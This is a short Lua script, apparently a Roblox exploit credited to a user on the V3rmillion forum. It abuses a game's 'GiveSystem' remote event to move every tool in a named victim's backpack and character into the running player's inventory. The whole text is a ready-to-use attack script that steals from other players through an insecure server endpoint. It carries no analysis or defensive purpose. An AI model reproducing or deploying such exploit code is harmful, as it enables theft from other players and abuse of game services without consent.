--Thanks to prisj on V3rm

local target = game:GetService("Players").LocalPlayer
local plr = game.Players.NAME -- Person you want to steal all items from
for i,v in pairs(plr.Backpack:GetChildren()) do
if v:IsA('Tool') then
workspace.GiveSystem.Group:FireServer(target, v)
end
end

for i,v in pairs(plr.Character:GetChildren()) do
if v:IsA('Tool') then
workspace.GiveSystem.Group:FireServer(target, v)
end
end
